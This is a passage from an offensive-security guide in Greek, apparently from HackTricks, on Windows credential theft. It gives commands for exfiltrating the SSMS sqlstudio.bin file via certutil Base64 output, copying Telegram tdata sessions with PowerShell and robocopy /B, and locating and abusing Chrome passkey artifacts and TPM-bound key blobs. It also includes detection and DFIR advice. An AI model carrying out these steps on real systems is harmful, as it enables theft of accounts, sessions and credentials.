Το SQL Server Management Studio (SSMS) αποθηκεύει πληροφορίες αποθηκευμένων συνδέσεων σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Εξειδικευμένα εργαλεία dump μπορούν να αναλύσουν το αρχείο και να ανακτήσουν αποθηκευμένα SQL credentials. Σε shells που επιστρέφουν μόνο την έξοδο εντολών, το αρχείο συχνά γίνεται exfiltrate αφού κωδικοποιηθεί σε Base64 και εκτυπωθεί στο stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Από την πλευρά του χειριστή, αναδημιουργήστε το αρχείο και εκτελέστε το dumper τοπικά για να ανακτήσετε διαπιστευτήρια:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Κλοπή συνεδρίας browser και cookies μέσω του Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Κλοπή συνεδρίας `tdata` του Telegram Desktop

Το Telegram Desktop αποθηκεύει τα δεδομένα εξουσιοδότησης και κατάστασης λογαριασμού στον κατάλογό του **`tdata`**. Μια αντιγραμμένη συνεδρία μπορεί να φορτωθεί από συμβατά εργαλεία για έλεγχο ταυτότητας χωρίς τον κωδικό πρόσβασης του λογαριασμού, όσο αυτή η εξουσιοδότηση παραμένει έγκυρη· αν είναι ενεργοποιημένη η κρυπτογράφηση τοπικών δεδομένων, ο stealer χρειάζεται επίσης τον κωδικό πρόσβασης της εφαρμογής. Μια συνεδρία με έλεγχο ταυτότητας μπορεί στη συνέχεια να αποκαλύψει δεδομένα ταυτότητας, μεταδεδομένα διαλόγων και συμμετοχών, μηνύματα και αρχεία πολυμέσων προς λήψη.<sup>[[10]](#references)</sup>

### Εντοπισμός και απόκτηση

Αναζητήστε τόσο εγκατεστημένες όσο και φορητές διατάξεις· τα ονόματα πακέτων του Microsoft Store διαφέρουν, επομένως απαριθμήστε τους καταλόγους πακέτων που περιέχουν το `TelegramMessenge` και ελέγξτε το υποδέντρο `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Αν αποτύχουν οι συνήθεις αναγνώσεις και το token της διεργασίας **περιέχει ήδη και έχει ενεργοποιημένο** το `SeBackupPrivilege`, η πρόσβαση με σημασιολογία backup παρέχει εναλλακτική· δεν αποκτά το προνόμιο ούτε ανυψώνει τα δικαιώματα της διεργασίας. Η `CreateFileW` με `FILE_FLAG_BACKUP_SEMANTICS` μπορεί να ζητήσει σημασιολογία backup/restore και να παρακάμψει τους ελέγχους ασφαλείας αρχείων, όταν υπάρχουν τα απαιτούμενα προνόμια στο token, αλλά η σημαία από μόνη της δεν παρακάμπτει ένα ασύμβατο κλείδωμα κοινής χρήσης.<sup>[[10]](#references)[[11]](#references)</sup>

Για ανοιχτά αρχεία που είναι κλειδωμένα, δημιουργήστε/διαβάστε ένα **Volume Shadow Copy**· για αρχεία των οποίων η πρόσβαση αποκλείεται από ACL, το `robocopy /B` χρησιμοποιεί λειτουργία backup και παρακάμπτει τα ACL αρχείων και καταλόγων.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Ένα implant που λαμβάνει υπόψη το εύρος ζώνης μπορεί αρχικά να υποβάλει μόνο τον κατάλογο διαδρομών αρχείων, να λάβει ένα αναγνωριστικό snapshot μαζί με τις διαδρομές που έχει ήδη αποθηκεύσει το C2 και να ανεβάσει μόνο τα αρχεία που λείπουν. Επομένως, ακόμη και μικρές, σταδιακές μεταφορές μετά από αναδρομική απαρίθμηση του `tdata` μπορεί να υποδηλώνουν επιτυχή κλοπή συνεδρίας.<sup>[[10]](#references)</sup>

### Εντοπισμός και περιορισμός

Συσχετίστε την αναδρομική πρόσβαση στο `tdata` από διεργασία που δεν ανήκει στο Telegram με την ενεργοποίηση του `SeBackupPrivilege`, ανοίγματα αρχείων με backup semantics, δραστηριότητα VSS ή μια θυγατρική διεργασία `robocopy.exe` που χρησιμοποιεί το `/B`. Επίσης, αναζητήστε ταχεία απαρίθμηση τόσο του `%APPDATA%` όσο και του `%LOCALAPPDATA%\Packages`, ακολουθούμενη από εξερχόμενες συνδέσεις από την ίδια διεργασία. Μετά τον συμβιβασμό, χρησιμοποιήστε τις **Ρυθμίσεις → Συσκευές** (ή **Απόρρητο και ασφάλεια → Ενεργές συνεδρίες**) για να τερματίσετε τις μη αναγνωρισμένες συνεδρίες· η ενεργοποίηση της επαλήθευσης σε δύο βήματα από μόνη της δεν ανακαλεί μια εξουσιοδότηση που έχει ήδη κλαπεί.<sup>[[10]](#references)[[13]](#references)</sup>

## Passkeys / Κλοπή διαπιστευτηρίων WebAuthn από το Chrome στα Windows

Αν αποκτηθεί εκτέλεση κώδικα ως **ο χρήστης-θύμα** σε έναν κεντρικό υπολογιστή Windows που χρησιμοποιεί **Chrome + passkeys συγχρονισμένα μέσω του Google Password Manager**, τα passkeys αποτελούν ενδιαφέροντα στόχο post-exploitation, ακόμη και **χωρίς admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Ενδιαφέροντα τοπικά τεχνουργήματα

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** αποθηκεύει εγγραφές **`WebauthnCredentialSpecifics`** κωδικοποιημένες με protobuf. Μια διεργασία που εκτελείται ως ο ίδιος χρήστης μπορεί να απαριθμήσει το **RP ID**, το **username**, το **credential ID** και το κρυπτογραφημένο υλικό ιδιωτικού κλειδιού για συγχρονισμένα passkeys.<sup>[[5]](#references)</sup>
- Το **`passkey_enclave_state`** αποθηκεύει την κατάσταση εγγραφής της τοπικής συσκευής, όπως το **`wrapped_identity_private_key`** και το περιτυλιγμένο μυστικό που χρησιμοποιείται για την ανάκτηση συγχρονισμένων διαπιστευτηρίων.<sup>[[4]](#references)</sup>

Γρήγορη διαλογή:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Τα blobs κλειδιών που είναι δεσμευμένα στο TPM μπορούν και πάλι να χρησιμοποιηθούν καταχρηστικά ως τοπικό oracle υπογραφής

Αν ο browser εξαγάγει ένα κλειδί ταυτότητας που υποστηρίζεται από TPM ως **`NCRYPT_OPAQUE_KEY_BLOB`** και αποθηκεύσει αυτό το blob σε κατάσταση προσβάσιμη από τον χρήστη, το malware **δεν** χρειάζεται να εξαγάγει το ακατέργαστο ιδιωτικό κλειδί. Μπορεί απλώς να επανεισαγάγει το blob στο **ίδιο μηχάνημα** και να ζητήσει από το τοπικό TPM να υπογράψει δεδομένα που ελέγχει ο εισβολέας:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Αυτό σημαίνει ότι η **δέσμευση σε hardware εμποδίζει την εξαγωγή εκτός συσκευής, αλλά όχι τη χρήση από τον ίδιο χρήστη στο παραβιασμένο endpoint**.

### Πρακτικές οδοί κατάχρησης

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Απαρίθμηση των `WebauthnCredentialSpecifics` από το LevelDB του Chrome.
   - Έναρξη σύνδεσης με passkey και λήψη νέου WebAuthn challenge.
   - Χρήση του κλεμμένου blob `wrapped_identity_private_key` στο TPM του θύματος για την υπογραφή του binding του αιτήματος cloud-authenticator.
   - Αναμετάδοση του assertion που επιστρέφεται στο relying party.
   - Αυτό είναι ιδιαίτερα χρήσιμο όταν το RP αποδέχεται `userVerification=preferred` ή δεν απορρίπτει assertions με **`UV=0`**.
2. **Υποκλοπή εκκρεμούς UV-key**<sup>[[4]](#references)</sup>
   - Εξαναγκασμός επανένταξης με διαγραφή του `passkey_enclave_state` ή αποστολή έγκυρης υπογεγραμμένης λειτουργίας `device/forget`.
   - Αν η διαδικασία ένταξης αφήσει τη συσκευή σε κατάσταση **`uv_key_pending`**, καταχώριση δημόσιου UV key που ελέγχεται από τον επιτιθέμενο.
   - Αν ο πάροχος δεν επαληθεύει το attestation / την προέλευση από secure hardware για το νέο UV key, οι μεταγενέστερες υπογραφές από το key του επιτιθέμενου αντιμετωπίζονται ως **`UV=1`**.
3. **Υποκλοπή ανάκτησης master-secret / SDS**<sup>[[4]](#references)</sup>
   - Εξαναγκασμός ανάκτησης ή επανένταξης, ώστε το Chrome να ανακτήσει το master secret των συγχρονισμένων passkeys.
   - Παρακολούθηση της αναδημιουργίας/τροποποίησης του `passkey_enclave_state` και, στη συνέχεια, απόρριψη της μνήμης του Chrome ενώ το plaintext **security domain secret (SDS)** βρίσκεται στη μνήμη.
   - Χρήση του ανακτημένου SDS για αποκρυπτογράφηση των κρυπτογραφημένων πεδίων σε κάθε εγγραφή `WebauthnCredentialSpecifics` και ανάκτηση φορητών ιδιωτικών κλειδιών WebAuthn.

### Ιδέες για DFIR / εντοπισμό

- Παρακολούθηση της **διαγραφής/αναδημιουργίας** του `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Ειδοποίηση για μη φυσιολογική πρόσβαση στο Chrome **`Sync Data\LevelDB`** από διεργασίες που δεν είναι browser.
- Ειδοποίηση για **dumps μνήμης του Chrome** ή ύποπτη πρόσβαση στη μνήμη μεταξύ διεργασιών.
- Διερεύνηση επαναλαμβανόμενων προτροπών για **PIN ανάκτησης του Google Password Manager** ή μη αναμενόμενης επανένταξης.
- Να θυμάστε ότι το WebAuthn **`signCount`** συχνά δεν είναι χρήσιμο για συγχρονισμένα passkeys, επειδή μπορεί να παραμένει σταθερό, οπότε ο κλασικός εντοπισμός κλώνων είναι αδύναμος.

## References

- [1] [Unit 42 – Διερεύνηση πολυετών επιχειρήσεων που στόχευαν τομείς υψηλής αξίας και δεν εντοπίστηκαν](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: ηλεκτρονικό ψάρεμα μέσω μακροεντολής Word VBA μέσω SMTP → αποκρυπτογράφηση διαπιστευτηρίων hMailServer → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Μέσα στο Ink Dragon: αποκάλυψη του δικτύου relay και της εσωτερικής λειτουργίας μιας συγκαλυμμένης επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: μια νέα επιφάνεια επίθεσης στον έλεγχο ταυτότητας χωρίς κωδικό πρόσβασης](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / αποθήκευση κλειδιών CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Επιθέσεις σε συστήματα και δίκτυα Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Πώς λειτουργεί πραγματικά το αποθετήριο δεδομένων του Active Directory: μέσα στο NTDS.dit (Μέρος 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Απόρριψη κωδικών πρόσβασης από απομακρυσμένο Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Το Armored Likho διευρύνει το οπλοστάσιο κυβερνοκατασκοπείας του με το toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Συνάρτηση CreateFileW και `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Λειτουργία δημιουργίας αντιγράφων ασφαλείας Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Συχνές ερωτήσεις του Telegram – τερματισμός ενεργών συνδέσεων](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard και Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Προστασία και διαχείριση διαπιστευτηρίων](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
